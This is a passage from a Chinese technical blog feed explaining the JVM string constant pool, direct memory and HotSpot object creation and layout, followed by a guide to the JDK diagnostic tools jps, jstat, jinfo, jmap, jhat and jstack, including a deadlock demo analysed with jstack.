class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在堆中创建字符串对象”ab“</span></span><br><span class="line"><span class="comment">// 将字符串对象”ab“的引用保存在字符串常量池中</span></span><br><span class="line"><span class="type">String</span> <span class="variable">aa</span> <span class="operator">=</span> <span class="string">"ab"</span>;</span><br><span class="line"><span class="comment">// 直接返回字符串常量池中字符串对象”ab“的引用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">bb</span> <span class="operator">=</span> <span class="string">"ab"</span>;</span><br><span class="line">System.out.println(aa==bb);<span class="comment">// true</span></span><br></pre></td></tr></tbody></table></figure><p>HotSpot 虚拟机中字符串常量池的实现是 <code>src/hotspot/share/classfile/stringTable.cpp</code> ,<code>StringTable</code> 可以简单理解为一个固定大小的<code>HashTable</code> ，容量为 <code>StringTableSize</code>（可以通过 <code>-XX:StringTableSize</code> 参数来设置），保存的是字符串（key）和 字符串对象的引用（value）的映射关系，字符串对象的引用指向堆中的字符串对象。</p><p>JDK1.7 之前，字符串常量池存放在永久代。JDK1.7 字符串常量池和静态变量从永久代移动了 Java 堆中。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/method-area-jdk1.6.png" alt="method-area-jdk1.6"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/method-area-jdk1.7.png" alt="method-area-jdk1.7"></p><p><strong>JDK 1.7 为什么要将字符串常量池移动到堆中？</strong></p><p>主要是因为永久代（方法区实现）的 GC 回收效率太低，只有在整堆收集 (Full GC)的时候才会被执行 GC。Java 程序中通常会有大量的被创建的字符串等待回收，将字符串常量池放到堆中，能够更高效及时地回收字符串内存。</p><p>相关问题：<a href="https://www.zhihu.com/question/57109429/answer/151717241">JVM 常量池中存储的是对象还是引用呢？ - RednaxelaFX - 知乎</a></p><p>最后再来分享一段周志明老师在<a href="https://github.com/fenixsoft/jvm_book">《深入理解 Java 虚拟机（第 3 版）》样例代码&amp;勘误</a> GitHub 仓库的 <a href="https://github.com/fenixsoft/jvm_book/issues/112">issue#112</a> 中说过的话：</p><blockquote><p><strong>运行时常量池、方法区、字符串常量池这些都是不随虚拟机实现而改变的逻辑概念，是公共且抽象的，Metaspace、Heap 是与具体某种虚拟机实现相关的物理概念，是私有且具体的。</strong></p></blockquote><h3 id="直接内存"><a href="#直接内存" class="headerlink" title="直接内存"></a>直接内存</h3><p>直接内存是一种特殊的内存缓冲区，并不在 Java 堆或方法区中分配的，而是通过 JNI 的方式在本地内存上分配的。</p><p>直接内存并不是虚拟机运行时数据区的一部分，也不是虚拟机规范中定义的内存区域，但是这部分内存也被频繁地使用。而且也可能导致 <code>OutOfMemoryError</code> 错误出现。</p><p>JDK1.4 中新加入的 <strong>NIO（Non-Blocking I/O，也被称为 New I/O）</strong>，引入了一种基于<strong>通道（Channel）</strong>与<strong>缓存区（Buffer）</strong>的 I/O 方式，它可以直接使用 Native 函数库直接分配堆外内存，然后通过一个存储在 Java 堆中的 DirectByteBuffer 对象作为这块内存的引用进行操作。这样就能在一些场景中显著提高性能，因为<strong>避免了在 Java 堆和 Native 堆之间来回复制数据</strong>。</p><p>直接内存的分配不会受到 Java 堆的限制，但是，既然是内存就会受到本机总内存大小以及处理器寻址空间的限制。</p><p>类似的概念还有 <strong>堆外内存</strong> 。在一些文章中将直接内存等价于堆外内，个人觉得不是特别准确。</p><p>堆外内存就是把内存对象分配在堆（新生代+老年代+永久代）以外的内存，这些内存直接受操作系统管理（而不是虚拟机），这样做的结果就是能够在一定程度上减少垃圾回收对应用程序造成的影响。</p><h2 id="HotSpot-虚拟机对象探秘"><a href="#HotSpot-虚拟机对象探秘" class="headerlink" title="HotSpot 虚拟机对象探秘"></a>HotSpot 虚拟机对象探秘</h2><p>通过上面的介绍我们大概知道了虚拟机的内存情况，下面我们来详细的了解一下 HotSpot 虚拟机在 Java 堆中对象分配、布局和访问的全过程。</p><h3 id="对象的创建"><a href="#对象的创建" class="headerlink" title="对象的创建"></a>对象的创建</h3><p>Java 对象的创建过程我建议最好是能默写出来，并且要掌握每一步在做什么。</p><h4 id="Step1-类加载检查"><a href="#Step1-类加载检查" class="headerlink" title="Step1:类加载检查"></a>Step1:类加载检查</h4><p>虚拟机遇到一条 new 指令时，首先将去检查这个指令的参数是否能在常量池中定位到这个类的符号引用，并且检查这个符号引用代表的类是否已被加载过、解析和初始化过。如果没有，那必须先执行相应的类加载过程。</p><h4 id="Step2-分配内存"><a href="#Step2-分配内存" class="headerlink" title="Step2:分配内存"></a>Step2:分配内存</h4><p>在<strong>类加载检查</strong>通过后，接下来虚拟机将为新生对象<strong>分配内存</strong>。对象所需的内存大小在类加载完成后便可确定，为对象分配空间的任务等同于把一块确定大小的内存从 Java 堆中划分出来。<strong>分配方式</strong>有 <strong>“指针碰撞”</strong> 和 <strong>“空闲列表”</strong> 两种，<strong>选择哪种分配方式由 Java 堆是否规整决定，而 Java 堆是否规整又由所采用的垃圾收集器是否带有压缩整理功能决定</strong>。</p><p><strong>内存分配的两种方式</strong> （补充内容，需要掌握）：</p><ul><li>指针碰撞：<ul><li>适用场合：堆内存规整（即没有内存碎片）的情况下。</li><li>原理：用过的内存全部整合到一边，没有用过的内存放在另一边，中间有一个分界指针，只需要向着没用过的内存方向将该指针移动对象内存大小位置即可。</li><li>使用该分配方式的 GC 收集器：Serial, ParNew</li></ul></li><li>空闲列表：<ul><li>适用场合：堆内存不规整的情况下。</li><li>原理：虚拟机会维护一个列表，该列表中会记录哪些内存块是可用的，在分配的时候，找一块儿足够大的内存块儿来划分给对象实例，最后更新列表记录。</li><li>使用该分配方式的 GC 收集器：CMS</li></ul></li></ul><p>选择以上两种方式中的哪一种，取决于 Java 堆内存是否规整。而 Java 堆内存是否规整，取决于 GC 收集器的算法是”标记-清除”，还是”标记-整理”（也称作”标记-压缩”），值得注意的是，复制算法内存也是规整的。</p><p><strong>内存分配并发问题（补充内容，需要掌握）</strong></p><p>在创建对象的时候有一个很重要的问题，就是线程安全，因为在实际开发过程中，创建对象是很频繁的事情，作为虚拟机来说，必须要保证线程是安全的，通常来讲，虚拟机采用两种方式来保证线程安全：</p><ul><li><strong>CAS+失败重试：</strong> CAS 是乐观锁的一种实现方式。所谓乐观锁就是，每次不加锁而是假设没有冲突而去完成某项操作，如果因为冲突失败就重试，直到成功为止。<strong>虚拟机采用 CAS 配上失败重试的方式保证更新操作的原子性。</strong></li><li><strong>TLAB：</strong> 为每一个线程预先在 Eden 区分配一块儿内存，JVM 在给线程中的对象分配内存时，首先在 TLAB 分配，当对象大于 TLAB 中的剩余内存或 TLAB 的内存已用尽时，再采用上述的 CAS 进行内存分配</li></ul><h4 id="Step3-初始化零值"><a href="#Step3-初始化零值" class="headerlink" title="Step3:初始化零值"></a>Step3:初始化零值</h4><p>内存分配完成后，虚拟机需要将分配到的内存空间都初始化为零值（不包括对象头），这一步操作保证了对象的实例字段在 Java 代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。</p><h4 id="Step4-设置对象头"><a href="#Step4-设置对象头" class="headerlink" title="Step4:设置对象头"></a>Step4:设置对象头</h4><p>初始化零值完成之后，<strong>虚拟机要对对象进行必要的设置</strong>，例如这个对象是哪个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的 GC 分代年龄等信息。 <strong>这些信息存放在对象头中。</strong> 另外，根据虚拟机当前运行状态的不同，如是否启用偏向锁等，对象头会有不同的设置方式。</p><h4 id="Step5-执行-init-方法"><a href="#Step5-执行-init-方法" class="headerlink" title="Step5:执行 init 方法"></a>Step5:执行 init 方法</h4><p>在上面工作都完成之后，从虚拟机的视角来看，一个新的对象已经产生了，但从 Java 程序的视角来看，对象创建才刚开始，<code>&lt;init&gt;</code> 方法还没有执行，所有的字段都还为零。所以一般来说，执行 new 指令之后会接着执行 <code>&lt;init&gt;</code> 方法，把对象按照程序员的意愿进行初始化，这样一个真正可用的对象才算完全产生出来。</p><h3 id="对象的内存布局"><a href="#对象的内存布局" class="headerlink" title="对象的内存布局"></a>对象的内存布局</h3><p>在 Hotspot 虚拟机中，对象在内存中的布局可以分为 3 块区域：<strong>对象头</strong>、<strong>实例数据</strong>和<strong>对齐填充</strong>。</p><p><strong>Hotspot 虚拟机的对象头包括两部分信息</strong>，<strong>第一部分用于存储对象自身的运行时数据</strong>（哈希码、GC 分代年龄、锁状态标志等等），<strong>另一部分是类型指针</strong>，即对象指向它的类元数据的指针，虚拟机通过这个指针来确定这个对象是哪个类的实例。</p><p><strong>实例数据部分是对象真正存储的有效信息</strong>，也是在程序中所定义的各种类型的字段内容。</p><p><strong>对齐填充部分不是必然存在的，也没有什么特别的含义，仅仅起占位作用。</strong> 因为 Hotspot 虚拟机的自动内存管理系统要求对象起始地址必须是 8 字节的整数倍，换句话说就是对象的大小必须是 8 字节的整数倍。而对象头部分正好是 8 字节的倍数（1 倍或 2 倍），因此，当对象实例数据部分没有对齐时，就需要通过对齐填充来补全。</p><h3 id="对象的访问定位"><a href="#对象的访问定位" class="headerlink" title="对象的访问定位"></a>对象的访问定位</h3><p>建立对象就是为了使用对象，我们的 Java 程序通过栈上的 reference 数据来操作堆上的具体对象。对象的访问方式由虚拟机实现而定，目前主流的访问方式有：<strong>使用句柄</strong>、<strong>直接指针</strong>。</p><h4 id="句柄"><a href="#句柄" class="headerlink" title="句柄"></a>句柄</h4><p>如果使用句柄的话，那么 Java 堆中将会划分出一块内存来作为句柄池，reference 中存储的就是对象的句柄地址，而句柄中包含了对象实例数据与对象类型数据各自的具体地址信息。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/access-location-of-object-handle.png" alt="对象的访问定位-使用句柄"></p><h4 id="直接指针"><a href="#直接指针" class="headerlink" title="直接指针"></a>直接指针</h4><p>如果使用直接指针访问，reference 中存储的直接就是对象的地址。</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/posts/576968662/access-location-of-object-handle-direct-pointer.png" alt="对象的访问定位-直接指针"></p><p>这两种对象访问方式各有优势。使用句柄来访问的最大好处是 reference 中存储的是稳定的句柄地址，在对象被移动时只会改变句柄中的实例数据指针，而 reference 本身不需要修改。使用直接指针访问方式最大的好处就是速度快，它节省了一次指针定位的时间开销。</p><p>HotSpot 虚拟机主要使用的就是这种方式来进行对象访问。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>javaguide: <a href="https://javaguide.cn/java/jvm/">https://javaguide.cn/java/jvm/</a></li><li>《深入理解 Java 虚拟机：JVM 高级特性与最佳实践（第二版》</li><li>《自己动手写 Java 虚拟机》</li><li>Chapter 2. The Structure of the Java Virtual Machine：<a href="https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-2.html">https://docs.oracle.com/javase/specs/jvms/se8/html/jvms-2.html</a></li><li>JVM 栈帧内部结构-动态链接：<a href="https://chenxitag.com/archives/368">https://chenxitag.com/archives/368</a></li><li>Java 中 new String(“字面量”) 中 “字面量” 是何时进入字符串常量池的? - 木女孩的回答 - 知乎：<a href="https://www.zhihu.com/question/55994121/answer/147296098">https://www.zhihu.com/question/55994121/answer/147296098</a></li><li>JVM 常量池中存储的是对象还是引用呢？ - RednaxelaFX 的回答 - 知乎：<a href="https://www.zhihu.com/question/57109429/answer/151717241">https://www.zhihu.com/question/57109429/answer/151717241</a></li><li><a href="http://www.pointsoftware.ch/en/under-the-hood-runtime-data-areas-javas-memory-model/">http://www.pointsoftware.ch/en/under-the-hood-runtime-data-areas-javas-memory-model/</a></li><li><a href="https://dzone.com/articles/jvm-permgen-%E2%80%93-where-art-thou">https://dzone.com/articles/jvm-permgen-%E2%80%93-where-art-thou</a></li><li><a href="https://stackoverflow.com/questions/9095748/method-area-and-permgen">https://stackoverflow.com/questions/9095748/method-area-and-permgen</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JVM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDK监控和故障处理工具总结</title>
      <link href="/posts/4058733264/"/>
      <url>/posts/4058733264/</url>
      
        <content type="html"><![CDATA[<h2 id="JDK-命令行工具"><a href="#JDK-命令行工具" class="headerlink" title="JDK 命令行工具"></a>JDK 命令行工具</h2><p>这些命令在 JDK 安装目录下的 bin 目录下：</p><ul><li><strong><code>jps</code></strong> (JVM Process Status）: 类似 UNIX 的 <code>ps</code> 命令。用于查看所有 Java 进程的启动类、传入参数和 Java 虚拟机参数等信息；</li><li>**<code>jstat</code>**（JVM Statistics Monitoring Tool）: 用于收集 HotSpot 虚拟机各方面的运行数据;</li><li><strong><code>jinfo</code></strong> (Configuration Info for Java) : Configuration Info for Java,显示虚拟机配置信息;</li><li><strong><code>jmap</code></strong> (Memory Map for Java) : 生成堆转储快照;</li><li><strong><code>jhat</code></strong> (JVM Heap Dump Browser) : 用于分析 heapdump 文件，它会建立一个 HTTP/HTML 服务器，让用户可以在浏览器上查看分析结果;</li><li><strong><code>jstack</code></strong> (Stack Trace for Java) : 生成虚拟机当前时刻的线程快照，线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈的集合。</li></ul><h3 id="jps-查看所有-Java-进程"><a href="#jps-查看所有-Java-进程" class="headerlink" title="jps:查看所有 Java 进程"></a><code>jps</code>:查看所有 Java 进程</h3><p><code>jps</code>(JVM Process Status) 命令类似 UNIX 的 <code>ps</code> 命令。</p><p><code>jps</code>：显示虚拟机执行主类名称以及这些进程的本地虚拟机唯一 ID（Local Virtual Machine Identifier,LVMID）。<code>jps -q</code>：只输出进程的本地虚拟机唯一 ID。</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\SnailClimb&gt;jps</span><br><span class="line"><span class="number">7360</span> NettyClient2</span><br><span class="line"><span class="number">17396</span></span><br><span class="line"><span class="number">7972</span> Launcher</span><br><span class="line"><span class="number">16504</span> Jps</span><br><span class="line"><span class="number">17340</span> NettyServer</span><br></pre></td></tr></tbody></table></figure><p><code>jps -l</code>:输出主类的全名，如果进程执行的是 Jar 包，输出 Jar 路径。</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\SnailClimb&gt;jps <span class="literal">-l</span></span><br><span class="line"><span class="number">7360</span> firstNettyDemo.NettyClient2</span><br><span class="line"><span class="number">17396</span></span><br><span class="line"><span class="number">7972</span> org.jetbrains.jps.cmdline.Launcher</span><br><span class="line"><span class="number">16492</span> sun.tools.jps.Jps</span><br><span class="line"><span class="number">17340</span> firstNettyDemo.NettyServer</span><br></pre></td></tr></tbody></table></figure><p><code>jps -v</code>：输出虚拟机进程启动时 JVM 参数。</p><p><code>jps -m</code>：输出传递给 Java 进程 main() 函数的参数。</p><h3 id="jstat-监视虚拟机各种运行状态信息"><a href="#jstat-监视虚拟机各种运行状态信息" class="headerlink" title="jstat: 监视虚拟机各种运行状态信息"></a><code>jstat</code>: 监视虚拟机各种运行状态信息</h3><p>jstat（JVM Statistics Monitoring Tool） 使用于监视虚拟机各种运行状态信息的命令行工具。 它可以显示本地或者远程（需要远程主机提供 RMI 支持）虚拟机进程中的类信息、内存、垃圾收集、JIT 编译等运行数据，在没有 GUI，只提供了纯文本控制台环境的服务器上，它将是运行期间定位虚拟机性能问题的首选工具。</p><p><strong><code>jstat</code> 命令使用格式：</strong></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jstat -&lt;option&gt; [-<span class="type">t</span>] [-<span class="type">h</span>&lt;<span class="type">lines</span>&gt;] &lt;vmid&gt; [&lt;<span class="built_in">int</span><span class="type">erval</span>&gt; [&lt;<span class="type">count</span>&gt;]]</span><br></pre></td></tr></tbody></table></figure><p>比如 <code>jstat -gc -h3 31736 1000 10</code>表示分析进程 id 为 31736 的 gc 情况，每隔 1000ms 打印一次记录，打印 10 次停止，每 3 行后打印指标头部。</p><p><strong>常见的 option 如下：</strong></p><ul><li><code>jstat -class vmid</code>：显示 ClassLoader 的相关信息；</li><li><code>jstat -compiler vmid</code>：显示 JIT 编译的相关信息；</li><li><code>jstat -gc vmid</code>：显示与 GC 相关的堆信息；</li><li><code>jstat -gccapacity vmid</code>：显示各个代的容量及使用情况；</li><li><code>jstat -gcnew vmid</code>：显示新生代信息；</li><li><code>jstat -gcnewcapcacity vmid</code>：显示新生代大小与使用情况；</li><li><code>jstat -gcold vmid</code>：显示老年代和永久代的行为统计，从 jdk1.8 开始,该选项仅表示老年代，因为永久代被移除了；</li><li><code>jstat -gcoldcapacity vmid</code>：显示老年代的大小；</li><li><code>jstat -gcpermcapacity vmid</code>：显示永久代大小，从 jdk1.8 开始,该选项不存在了，因为永久代被移除了；</li><li><code>jstat -gcutil vmid</code>：显示垃圾收集信息；</li></ul><p>另外，加上 <code>-t</code>参数可以在输出信息上加一个 Timestamp 列，显示程序的运行时间。</p><h3 id="jinfo-实时地查看和调整虚拟机各项参数"><a href="#jinfo-实时地查看和调整虚拟机各项参数" class="headerlink" title="jinfo: 实时地查看和调整虚拟机各项参数"></a><code>jinfo</code>: 实时地查看和调整虚拟机各项参数</h3><p><code>jinfo vmid</code> :输出当前 jvm 进程的全部参数和系统属性 (第一部分是系统的属性，第二部分是 JVM 的参数)。</p><p><code>jinfo -flag name vmid</code> :输出对应名称的参数的具体值。比如输出 MaxHeapSize、查看当前 jvm 进程是否开启打印 GC 日志 ( <code>-XX:PrintGCDetails</code> :详细 GC 日志模式，这两个都是默认关闭的)。</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\SnailClimb&gt;jinfo  <span class="literal">-flag</span> MaxHeapSize <span class="number">17340</span></span><br><span class="line"><span class="literal">-XX</span>:MaxHeapSize=<span class="number">2124414976</span></span><br><span class="line">C:\Users\SnailClimb&gt;jinfo  <span class="literal">-flag</span> PrintGC <span class="number">17340</span></span><br><span class="line"><span class="literal">-XX</span>:<span class="literal">-PrintGC</span></span><br></pre></td></tr></tbody></table></figure><p>使用 jinfo 可以在不重启虚拟机的情况下，可以动态的修改 jvm 的参数。尤其在线上的环境特别有用,请看下面的例子：</p><p><code>jinfo -flag [+|-]name vmid</code> 开启或者关闭对应名称的参数。</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\SnailClimb&gt;jinfo  <span class="literal">-flag</span>  PrintGC <span class="number">17340</span></span><br><span class="line"><span class="literal">-XX</span>:<span class="literal">-PrintGC</span></span><br><span class="line"></span><br><span class="line">C:\Users\SnailClimb&gt;jinfo  <span class="literal">-flag</span>  +PrintGC <span class="number">17340</span></span><br><span class="line"></span><br><span class="line">C:\Users\SnailClimb&gt;jinfo  <span class="literal">-flag</span>  PrintGC <span class="number">17340</span></span><br><span class="line"><span class="literal">-XX</span>:+PrintGC</span><br></pre></td></tr></tbody></table></figure><h3 id="jmap-生成堆转储快照"><a href="#jmap-生成堆转储快照" class="headerlink" title="jmap:生成堆转储快照"></a><code>jmap</code>:生成堆转储快照</h3><p><code>jmap</code>（Memory Map for Java）命令用于生成堆转储快照。 如果不使用 <code>jmap</code> 命令，要想获取 Java 堆转储，可以使用 <code>“-XX:+HeapDumpOnOutOfMemoryError”</code> 参数，可以让虚拟机在 OOM 异常出现之后自动生成 dump 文件，Linux 命令下可以通过 <code>kill -3</code> 发送进程退出信号也能拿到 dump 文件。</p><p><code>jmap</code> 的作用并不仅仅是为了获取 dump 文件，它还可以查询 finalizer 执行队列、Java 堆和永久代的详细信息，如空间使用率、当前使用的是哪种收集器等。和<code>jinfo</code>一样，<code>jmap</code>有不少功能在 Windows 平台下也是受限制的。</p><p>示例：将指定应用程序的堆快照输出到桌面。后面，可以通过 jhat、Visual VM 等工具分析该堆文件。</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\SnailClimb&gt;jmap <span class="literal">-dump</span>:format=b,file=C:\Users\SnailClimb\Desktop\heap.hprof <span class="number">17340</span></span><br><span class="line">Dumping heap to C:\Users\SnailClimb\Desktop\heap.hprof ...</span><br><span class="line">Heap dump file created</span><br></pre></td></tr></tbody></table></figure><h3 id="jhat-分析-heapdump-文件"><a href="#jhat-分析-heapdump-文件" class="headerlink" title="jhat: 分析 heapdump 文件"></a><strong><code>jhat</code></strong>: 分析 heapdump 文件</h3><p><strong><code>jhat</code></strong> 用于分析 heapdump 文件，它会建立一个 HTTP/HTML 服务器，让用户可以在浏览器上查看分析结果。</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\SnailClimb&gt;jhat C:\Users\SnailClimb\Desktop\heap.hprof</span><br><span class="line">Reading from C:\Users\SnailClimb\Desktop\heap.hprof...</span><br><span class="line">Dump file created Sat May <span class="number">04</span> <span class="number">12</span>:<span class="number">30</span>:<span class="number">31</span> CST <span class="number">2019</span></span><br><span class="line">Snapshot read, resolving...</span><br><span class="line">Resolving <span class="number">131419</span> objects...</span><br><span class="line">Chasing references, expect <span class="number">26</span> dots..........................</span><br><span class="line">Eliminating duplicate references..........................</span><br><span class="line">Snapshot resolved.</span><br><span class="line">Started HTTP server on port <span class="number">7000</span></span><br><span class="line">Server is ready.</span><br></pre></td></tr></tbody></table></figure><p>访问 <a href="http://localhost:7000/">http://localhost:7000/</a></p><h3 id="jstack-生成虚拟机当前时刻的线程快照"><a href="#jstack-生成虚拟机当前时刻的线程快照" class="headerlink" title="jstack :生成虚拟机当前时刻的线程快照"></a><strong><code>jstack</code></strong> :生成虚拟机当前时刻的线程快照</h3><p><code>jstack</code>（Stack Trace for Java）命令用于生成虚拟机当前时刻的线程快照。线程快照就是当前虚拟机内每一条线程正在执行的方法堆栈的集合.</p><p>生成线程快照的目的主要是定位线程长时间出现停顿的原因，如线程间死锁、死循环、请求外部资源导致的长时间等待等都是导致线程长时间停顿的原因。线程出现停顿的时候通过<code>jstack</code>来查看各个线程的调用堆栈，就可以知道没有响应的线程到底在后台做些什么事情，或者在等待些什么资源。</p><p><strong>下面是一个线程死锁的代码。我们下面会通过 <code>jstack</code> 命令进行死锁检查，输出死锁信息，找到发生死锁的线程。</strong></p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeadLockDemo</span> {</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">resource1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();<span class="comment">//资源 1</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">resource2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();<span class="comment">//资源 2</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> {</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; {</span><br><span class="line">            <span class="keyword">synchronized</span> (resource1) {</span><br><span class="line">                System.out.println(Thread.currentThread() + <span class="string">"get resource1"</span>);</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                } <span class="keyword">catch</span> (InterruptedException e) {</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                }</span><br><span class="line">                System.out.println(Thread.currentThread() + <span class="string">"waiting get resource2"</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (resource2) {</span><br><span class="line">                    System.out.println(Thread.currentThread() + <span class="string">"get resource2"</span>);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }, <span class="string">"线程 1"</span>).start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; {</span><br><span class="line">            <span class="keyword">synchronized</span> (resource2) {</span><br><span class="line">                System.out.println(Thread.currentThread() + <span class="string">"get resource2"</span>);</span><br><span class="line">                <span class="keyword">try</span> {</span><br><span class="line">                    Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                } <span class="keyword">catch</span> (InterruptedException e) {</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                }</span><br><span class="line">                System.out.println(Thread.currentThread() + <span class="string">"waiting get resource1"</span>);</span><br><span class="line">                <span class="keyword">synchronized</span> (resource1) {</span><br><span class="line">                    System.out.println(Thread.currentThread() + <span class="string">"get resource1"</span>);</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">        }, <span class="string">"线程 2"</span>).start();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>Output</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Thread[线程 1,5,main]get resource1</span><br><span class="line">Thread[线程 2,5,main]get resource2</span><br><span class="line">Thread[线程 1,5,main]waiting get resource2</span><br><span class="line">Thread[线程 2,5,main]waiting get resource1</span><br></pre></td></tr></tbody></table></figure><p>线程 A 通过 synchronized (resource1) 获得 resource1 的监视器锁，然后通过<code> Thread.sleep(1000);</code>让线程 A 休眠 1s 为的是让线程 B 得到执行然后获取到 resource2 的监视器锁。线程 A 和线程 B 休眠结束了都开始企图请求获取对方的资源，然后这两个线程就会陷入互相等待的状态，这也就产生了死锁。</p><p><strong>通过 <code>jstack</code> 命令分析：</strong></p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\SnailClimb&gt;jps</span><br><span class="line"><span class="number">13792</span> KotlinCompileDaemon</span><br><span class="line"><span class="number">7360</span> NettyClient2</span><br><span class="line"><span class="number">17396</span></span><br><span class="line"><span class="number">7972</span> Launcher</span><br><span class="line"><span class="number">8932</span> Launcher</span><br><span class="line"><span class="number">9256</span> DeadLockDemo</span><br><span class="line"><span class="number">10764</span> Jps</span><br><span class="line"><span class="number">17340</span> NettyServer</span><br><span class="line"></span><br><span class="line">C:\Users\SnailClimb&gt;jstack <span class="number">9256</span></span><br></pre></td></tr></tbody></table></figure><p>输出的部分内容如下：</p><figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Found one Java<span class="literal">-level</span> deadlock:</span><br><span class="line">=============================</span><br><span class="line"><span class="string">"线程 2"</span>:</span><br><span class="line">  waiting to lock monitor <span class="number">0</span>x000000000333e668 (object <span class="number">0</span>x00000000d5efe1c0, a java.lang.Object),</span><br><span class="line">  which is held by <span class="string">"线程 1"</span></span><br><span class="line"><span class="string">"线程 1"</span>:</span><br><span class="line">  waiting to lock monitor <span class="number">0</span>x000000000333be88 (object <span 